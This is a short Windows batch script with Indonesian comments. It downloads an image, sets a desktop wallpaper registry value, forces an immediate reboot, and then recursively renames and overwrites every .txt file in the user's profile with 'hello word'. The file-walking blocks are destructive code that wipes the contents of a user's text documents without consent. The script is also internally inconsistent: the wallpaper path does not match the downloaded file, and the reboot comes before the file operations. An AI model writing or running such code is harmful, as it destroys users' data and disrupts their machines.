::Download gambar - reboot - set wallpaper ###
@echo off

curl -L -s "https://i.ibb.co.com/Z6WSw3cz/PATIENCE.png" -o "%USERPROFILE%\Music\GD_001.jpg"

set img=%USERPROFILE%\Downloads\me.jpg

reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%img%" /f >nul 2>&1

shutdown /r /t 0


:: rename *.txt menjadi ALLUSER
setlocal enabledelayedexpansion

set count=1

for /r "%USERPROFILE%" %%f in (*.txt) do (
    ren "%%f" "ALLUSER_!count!.txt"
    set /a count+=1
)

::ubah isi *.txt - hello word
for /r "%USERPROFILE%" %%f in (*.txt) do (
    echo hello word > "%%f"
)

